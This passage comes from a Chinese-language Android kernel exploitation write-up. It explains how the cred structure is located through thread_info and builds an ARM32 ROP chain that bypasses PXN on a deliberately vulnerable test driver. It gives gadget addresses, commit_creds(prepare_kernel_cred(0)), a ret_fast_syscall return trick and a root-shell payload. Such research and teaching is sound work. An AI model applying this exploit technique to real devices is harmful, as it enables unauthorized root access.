@@ -1,0 +1,149 @@
+            kgid_t          sgid;           /* saved GID of the task */
+            kuid_t          euid;           /* effective UID of the task */
+            kgid_t          egid;           /* effective GID of the task */
+            kuid_t          fsuid;          /* UID for VFS ops */
+            kgid_t          fsgid;          /* GID for VFS ops */
+            unsigned        securebits;     /* SUID-less security management */
+            kernel_cap_t    cap_inheritable; /* caps our children can inherit */
+            kernel_cap_t    cap_permitted;  /* caps we're permitted */
+            kernel_cap_t    cap_effective;  /* caps we can actually use */
+            kernel_cap_t    cap_bset;       /* capability bounding set */
+            kernel_cap_t    cap_ambient;    /* Ambient capability set */
+    #ifdef CONFIG_KEYS
+            unsigned char   jit_keyring;    /* default keyring to attach requested
+                                             * keys to */
+            struct key __rcu *session_keyring; /* keyring inherited over fork */
+            struct key      *process_keyring; /* keyring private to this process */
+            struct key      *thread_keyring; /* keyring private to this thread */
+            struct key      *request_key_auth; /* assumed request_key authority */
+    #endif
+    #ifdef CONFIG_SECURITY
+            void            *security;      /* subjective LSM security */
+    #endif
+            struct user_struct *user;       /* real user ID subscription */
+            struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+            struct group_info *group_info;  /* supplementary groups for euid/fsgid */
+            struct rcu_head rcu;            /* RCU deletion hook */
+    };
+    ......
+每个进程都有一个单独`thread_info`结构体，我们来看看内核是怎么获取到每个进程的`thread_info`结构体的信息的：
+    #define THREAD_SIZE             8192
+    ......
+    static inline struct thread_info *current_thread_info(void)
+    {
+            register unsigned long sp asm ("sp");
+            return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
+    }
+有点内核基础知识的应该知道，内核的栈是有大小限制的，在arm32中栈的大小是0x2000，而`thread_info`的信息储存在栈的最底部
+所以，如果我们能获取到当前进程在内核中运行时的其中一个栈地址，我们就能找到`thread_info`，从而顺藤摸瓜得到`cred`的地址，如果能任意写内核，则可以修改`cred`的信息，从而提权
+总得来说，内核提权其实只有一条路可走，就是修改cred信息，而`commit_creds(prepare_kernel_cred(0));`不过是内核提供的修改cred的函数罢了。
+我们来通过gdb展示下cred数据：
+    $ shell@generic:/ $ id
+    id
+    uid=2000(shell) gid=1007(log) context=u:r:init_shell:s0
+    --------------------------------------
+通过gdb可以获取到：`$sp : 0xd415bf40`
+从而计算出栈底地址：0xd415a000
+然后我们就能获取到`thread_info`的信息，然后得到`task_struct`的地址：0xd4d16680
+![
+](https://images.seebug.org/content/images/2019/02/8e7759ae-9c62-4287-a3a4-58fb7b05008a.png-w331s)
+接着我们查看task_struct的信息，得到了cred的地址：0xd4167780
+    gef> p *(struct task_struct *)0xd4d16680
+    $2 = {
+    ......
+            real_cred = 0xd4167780, 
+            cred = 0xd4167780,
+    ......
+    # 数据太长了，就不截图了
+然后查看cred的信息：
+![
+](https://images.seebug.org/content/images/2019/02/3de8b38b-b41b-48b4-a034-c075f7b8557f.png-w331s)
+把uid和gid的十六进制转换成十进制，发现就是当前进程的权限
+## 使用ROP绕过PXN来进行android提权
+既然我们已经知道了怎么修改权限，那么接下来就研究一下如何利用漏洞来提权，因为是研究利用方式，所以自己造了一个最基础的栈溢出
+    int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
+    {
+        char buf[MAX_LENGTH];
+        if (copy_from_user(&buf, ubuf, count)) {
+            printk(KERN_INFO "stackBufferProcEntry: error copying data from userspace\n");
+            return -EFAULT;
+        }
+        return count;
+    }
+因为开了PXN，所以没办法使用shellcode，然后我第一个想到的思路就是使用ROP来执行shellcode的操作
+这里说一下，不要使用`ROPgadget`，用这个跑内核的ELF，要跑贼久，推荐使用ROPPER[4]
+    $ ropper -f /mnt/hgfs/tmp/android_kernel/ranchu_3.10_vmlinux --nocolor > ranchu_ropper_gadget
+然后就是找`commit_creds`,
+`prepare_kernel_cred`这两个函数的地址，在没有开启kalsr的内核中，我们可以直接把vmlinux丢到ida里面，找这两个函数的地址
+到这里，我们可以构造出如下的rop链：
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0xC00B8D68;      // ; mov r0, #0; pop {r4, pc}
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0xC00430F4;      // ; prepare_kernel_cred(0) -> pop {r3-r5, pc}
+    *pc++ = 0x41424344;      // r3
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0x41424344;      // r5
+    *pc++ = 0xC0042BFC;      // ; commit_creds -> pop {r4-r6, pc}
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0x41424344;      // r5
+    *pc++ = 0x41424344;      // r6
+在成功修改当前进程的权限之后，我们需要把当前进程从内核态切换回用户态，然后在用户态执行`/bin/sh`，就能提权成功了
+但是这里遇到一个问题，在shellcode中，使用的是:
+    "mov r3, #0x40000010\n\t"
+    "MSR    CPSR_c,R3\n\t"
+    "LDR     R3, =0x879c\n\t"     // payload function addr
+    "BLX     R3\n\t"
+我也很容易能找到gadget: `msr cpsr_c, r4; pop {r4, pc};`
+但是却没法成功切换回用户态，网上相关的资料几乎没有，我也找不到问题的原因，在执行完`msr cpsr_c,
+r4`指令以后，栈信息会发现变化，导致没法控制pc的跳转
+不过后来，我跟踪内核的执行，发现内核本身是通过`ret_fast_syscall`函数来切换回用户态的：
+    $ cat ./arch/arm/kernel/entry-common.S
+    ......
+    ret_fast_syscall:
+     UNWIND(.fnstart        )
+     UNWIND(.cantunwind     )
+            disable_irq                             @ disable interrupts
+            ldr     r1, [tsk, #TI_FLAGS]
+            tst     r1, #_TIF_WORK_MASK
+            bne     fast_work_pending
+            asm_trace_hardirqs_on
+            /* perform architecture specific actions before user return */
+            arch_ret_to_user r1, lr
+            ct_user_enter
+            restore_user_regs fast = 1, offset = S_OFF
+     UNWIND(.fnend          )
+    ......
+    -----------------------------       0xc000df80 :   cpsid   i
+       0xc000df84 : ldr r1, [r9]
+       0xc000df88 : tst r1, #7
+       0xc000df8c : bne 0xc000dfb0 
+       0xc000df90 :    ldr r1, [sp, #72]   ; 0x48
+       0xc000df94 :    ldr lr, [sp, #68]!  ; 0x44
+       0xc000df98 :    msr SPSR_fsxc, r1
+       0xc000df9c :    clrex
+       0xc000dfa0 : ldmdb  sp, {r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, sp, lr}
+       0xc000dfa4 :    nop; (mov r0, r0)
+       0xc000dfa8 :    add sp, sp, #12
+       0xc000dfac :    movs    pc, lr
+经过我测试发现，使用`msr SPSR_fsxc,
+r1`可以成功从内核态切换回用户态，但是该指令却只存在于该函数之前，无法找到相关的gadget，之后我想了很多利用该函数的方法，最后测试成功的方法是：
+计算有漏洞的溢出函数的栈和`ret_fast_syscall`函数栈的距离，在使用ROP执行完`commit_creds(prepare_kernel_cred(0));`之后，使用合适的gadget来修改栈地址(比如:
+`add sp, sp, #0x30; pop {r4, r5, r6, pc};`)，然后控制pc跳转到`0xc000df90
+:`，这样程序就相当于执行完了内核的syscall，然后切换回用户进程代码继续执行，在我们的用户态代码中后续执行如下函数，就能成功提权：
+    void payload(void)
+    {        
+            if (getuid() == 0) {
+                    execl("/system/bin/sh", "sh", NULL);
+            } else {
+                    warnx("failed to get root. How did we even get here?");
+            }
+            _exit(0);
+    }
+完整exp可以见我的Github。
+ROP只是其中一种利用方法，后续还会研究其他利用方法和在64位android下的利用。
+# 参考
+  1. 
+  2. 
+  3. 
+  4. 
+* * *
